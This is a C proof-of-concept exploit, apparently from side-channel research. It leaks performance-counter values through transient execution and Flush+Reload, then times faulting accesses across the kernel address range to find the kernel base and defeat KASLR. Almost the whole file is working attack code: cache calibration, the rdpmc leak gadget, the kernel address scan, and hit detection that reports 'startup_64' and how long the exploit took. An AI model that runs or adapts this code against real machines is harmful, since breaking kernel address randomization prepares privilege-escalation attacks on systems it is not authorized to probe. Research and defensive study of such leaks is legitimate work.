#include <immintrin.h>
#include <setjmp.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

#include "cacheutils.h"

// If the poc is not working reliable one can tweak the iteration counts
// in the main or in the leak_pmc() function

//#define ARCHITECTURAL_PMC
#define NO_ITERATIONS 30
char* potential_kernel_addr;

int average(int* arr, int n) {
  uint64_t sum = 0;
  for (int i = 0; i < n; i++) {
    sum += arr[i];
  }
  return sum / n;
}

uint64_t read_pmc() {
  // read first counter (counter0)
  int rcx = 0xc1 | 0 << 30;
  rcx = 0x0;
  uint64_t low, high;
  asm volatile("mfence");
  asm volatile("rdpmc" : "=a"(low), "=d"(high) : "c"(rcx));
  asm volatile("mfence");
  return high << 32 | low;
}

#define SPACING 512
#define LEAKAGE_FAILED ((uint64_t)-1)

__attribute__((aligned(4096))) char mem[8][SPACING * 300];
int init = 0;

void init_leak_pmc() {
  memset(mem, 1, sizeof(mem));
  CACHE_MISS = detect_flush_reload_threshold() + 40;
  printf("Cache miss @ %zd\n", CACHE_MISS);
  init = 1;
}

__attribute__((aligned(4096))) uint64_t leak_pmc() {
  if (!init) {
    printf("[!] Call init_leak_pmc() first!\n");
    exit(1);
  }

  int i, j;
  for (j = 0; j < 8; j++) {
    for (i = 0; i < 256; i++) {
      flush(mem[j] + i * SPACING);
    }
  }
  asm volatile("mfence");

  //signal(SIGSEGV, trycatch_segfault_handler);

  for (size_t iterations = 0; iterations < 1; iterations++) {
    uint64_t low = 0, high = 0, try = 0;
    size_t start = rdtsc();

    do {
      for (int rep = 0; rep < 1; rep++) {
        if (!setjmp(trycatch_buf)) {
          asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
          asm volatile(
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              "imul %%rcx, %%rcx\n"
              :
              : "c"(7331)
              : "memory");
          asm volatile(
              "xor %%ecx, %%ecx\n\t"  // ATTENTION see [1]
              "rdpmc\n\t"
              : "=a"(low), "=d"(high)
              : "c"(0)  // ATTENTION see [1]
              : "memory");
          // [1]: even though this two lines seem redundant they are important!
          //      both together prevent compiler optimizations that lead to
          //      longer data dependencies and prevent the leakage
          asm volatile(
              // byte 1
              "movq %%rax, %%r11\n\t"
              "and $0xff00, %%r11\n\t"
              "shl $1, %%r11\n\t"
              "addq %[mem1], %%r11\n\t"
              "movq $1336, 0(%%r11)\n\t"
              // byte 2
              "movq %%rax, %%r12\n\t"
              "and $0xff0000, %%r12\n\t"
              "shr $7, %%r12\n\t"
              "addq %[mem2], %%r12\n\t"
              "movq $1337, 0(%%r12)\n\t"
              // byte 3
              "and $0xff000000, %%eax\n\t"
              "shr $15, %%eax\n\t"
              "addq %%rax, %%rcx\n\t"
              "movq $1338, 0(%%rcx)\n\t"
              // byte 4
              "and $0xff, %%rdx\n\t"
              "shl $9, %%rdx\n\t"
              "addq %%rdx, %%rbx\n\t"
              "movq $1339, 0(%%rbx)\n\t"
              :
              : "a"(low), "d"(high), "c"(&mem[3]),
                "b"(&mem[4]), [mem2] "r"(&mem[2]), [mem1] "r"(&mem[1])
              : "memory", "r11", "r12");

          try_abort();
        }
      }

      int hits = 0;
      uint64_t recovered = 0;
      int bytes_to_leak = 4;
      for (j = 1; j < 5; j++) {
        for (i = 1; i < 255; i++) {
          size_t idx = ((i * 167u) + 13u) & 255u;
          size_t delta = flush_reload_t(mem[j] + idx * SPACING);
          if (delta < CACHE_MISS) {
            recovered |= idx * ((uint64_t)1 << (j * 8));
            hits++;
            break;
          }
        }
      }
      if (hits == bytes_to_leak) {
        return recovered;
      }

      try++;
    } while (try < 1);

    size_t end = rdtsc();
    return LEAKAGE_FAILED;
  }
  return LEAKAGE_FAILED;
}

__attribute__((aligned(4096))) int main(int argc, char* argv[]) {
  uint64_t dummy = 0;
  signal(SIGSEGV, trycatch_segfault_handler);
#ifndef ARCHITECTURAL_PMC
  init_leak_pmc();
#endif

  uint64_t step = 0x0000000000200000;         // working
  uint64_t base = 0xffffffff80000000 - step;  // actual base
  uint64_t end = 0xfffffffff0000000;

  // Workflow for timing:
  // 1) we take the first $t_calibration_max_measurements measurements
  // 2) we calculate their average time
  int threshold = -1;
  int t_calibration_max_measurements = 15;
  int t_calibration_sum = 0;
  int t_calibrations_already_done = 0;

  struct timeval exploit_start_time, exploit_finish_time;
  gettimeofday(&exploit_start_time, NULL);

  for (uint64_t offset = 0; base + offset < end; offset += step) {
    potential_kernel_addr = (char*)base + offset;


    int checked_addr = 0;
    int deltas[NO_ITERATIONS] = {1};
    int errorcount = 0;
    while (!checked_addr && errorcount < 40) {
      memset(deltas, '\x00', NO_ITERATIONS * sizeof(deltas[0]));
      size_t measurements_taken = 0;
      for (int i = 0; i < NO_ITERATIONS; i++) {
#ifdef ARCHITECTURAL_PMC
        uint64_t before = read_pmc();
#else
        uint64_t before = leak_pmc();
        if (before == LEAKAGE_FAILED) {
          // usleep(5000);
          continue;
        }
#endif
        for (size_t j = 0; j < 100; j++) {
          if (!setjmp(trycatch_buf)) {
            asm volatile(
                "movq 0(%1), %%rax\n\t"
                "1:\n\t"
                "movq %%rax, %0\n\t"
                "jmp 1b\n\t"
                : "=r"(dummy)
                : "r"(potential_kernel_addr)
                : "rax");
          }
        }  // for (size_t j = 0; j < 10; j++)
#ifdef ARCHITECTURAL_PMC
        uint64_t after = read_pmc();
#else
        uint64_t after = leak_pmc();
        if (after == LEAKAGE_FAILED) {
          // usleep(5000);
          continue;
        }
#endif
        int delta = (int)(after - before);
        if (delta <= 0) {
          continue;
        }
        assert(measurements_taken < NO_ITERATIONS);
        assert(delta > 0);
        deltas[measurements_taken] = delta;
        measurements_taken++;
      }  // for (int i = 0; i < NO_ITERATIONS; i++)

      if (measurements_taken < 5) {
        printf(".");
        fflush(stdout);
        continue;
      }
      assert(measurements_taken <= NO_ITERATIONS);
      int avg = average(deltas, measurements_taken);
      int min = minimum(deltas, measurements_taken);
      float med = median(deltas, measurements_taken);
      printf("%p: %f (avg: %u - min: %d) over %d measurements\n",
        potential_kernel_addr, med, avg, min, measurements_taken);
      if (min == 0) {
        printf(".");
        fflush(stdout);
        continue;
      }
      
      checked_addr = 1;
      

      if (threshold != -1 && med > threshold && measurements_taken > (NO_ITERATIONS / 2)) {
        printf("[+] hit @ %p (threshold: %d)\n", potential_kernel_addr,
               threshold);
        // the first hit has a constant offset to startup_64
        printf("\033[92m[+] ksymbol startup_64 @ %p\033[0m\n",
               potential_kernel_addr + 0x0);
        printf("\033[92m[+] or ksymbol startup_64 @ %p\033[0m\n",
               potential_kernel_addr + 0x200000);
        gettimeofday(&exploit_finish_time, NULL);
        uint64_t microsec_used = (exploit_finish_time.tv_sec - exploit_start_time.tv_sec) * 1000000;
        microsec_used += exploit_finish_time.tv_usec - exploit_start_time.tv_usec;
        printf("[+] exploit took %lu ms (%lu microseconds)\n", 
          microsec_used / 1000, microsec_used);
        return 0;
      }

      if (t_calibrations_already_done < t_calibration_max_measurements) {
        t_calibration_sum += med;
        t_calibrations_already_done++;
      }
      if (t_calibrations_already_done == t_calibration_max_measurements &&
          threshold == -1) {
        threshold = t_calibration_sum / t_calibration_max_measurements;
        threshold *= 7;
        threshold /= 6;
        //threshold += 5000;
        // threshhold = 120000;
        printf("[+] Set threshold to %d\n", threshold);
      }
      errorcount++;
    }  // while (!checked_addr)
  }  // for (uint64_t offset = 0; base + offset < end; offset += step)

  return 0;
}
